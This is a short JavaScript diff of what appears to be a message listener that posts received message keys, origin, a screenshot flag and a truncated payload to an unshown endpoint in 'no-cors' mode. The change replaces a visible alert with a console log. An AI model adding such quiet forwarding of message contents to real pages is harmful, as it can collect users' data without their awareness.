@@ -23,15 +23,15 @@
             mode: "no-cors",
             body: JSON.stringify({
               timestamp: new Date().toISOString(),
-              origin: origin,
-              parentDoc: document.referrer || "N/A",
+              origin,
               keys,
               containsScreenshot: !!screenshot,
               truncated: JSON.stringify(payload).slice(0, 1000)
             })
           });
 
-          alert("📥 Message received from: " + origin + "\nKeys: " + keys.join(", "));
+          // Removed alert() entirely
+          console.log("📥 Message received. Keys:", keys);
         } catch (err) {
           console.error("Error processing message:", err);
         }
